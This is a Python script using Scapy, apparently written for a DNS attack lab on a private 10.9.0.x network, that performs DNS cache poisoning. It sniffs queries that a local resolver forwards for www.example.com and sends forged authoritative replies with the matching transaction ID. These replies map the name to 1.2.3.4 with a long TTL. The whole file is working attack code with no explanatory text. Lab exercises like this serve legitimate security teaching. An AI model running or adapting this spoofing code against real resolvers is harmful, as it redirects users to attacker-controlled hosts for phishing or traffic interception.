#!/usr/bin/env python3
from scapy.all import *

ATTACKER_IFACE = "br-8eecaee5cc49"
LOCAL_DNS_IP = "10.9.0.53"
TARGET_DOMAIN = b"www.example.com."

def poison(pkt):
    if DNS in pkt and pkt[DNS].qr == 0 and pkt[IP].src == LOCAL_DNS_IP and TARGET_DOMAIN in pkt[DNS].qd.qname:
        txid = pkt[DNS].id
        print(f"[+] Forwarded query seen (TXID={txid}) - sending forged reply")

        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp = UDP(sport=53, dport=33333)   # bind uses fixed port 33333

        ans = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.4', ttl=200000)

        dns = DNS(
            id=txid, qr=1, aa=1, rd=0,
            qd=pkt[DNS].qd,
            ancount=1, an=ans
        )

        send(ip/udp/dns, verbose=0)
        print("[+] Sent spoofed reply to local DNS server")

sniff(
    iface=ATTACKER_IFACE,
    filter=f"udp and src host {LOCAL_DNS_IP} and dst port 53",
    prn=poison
)
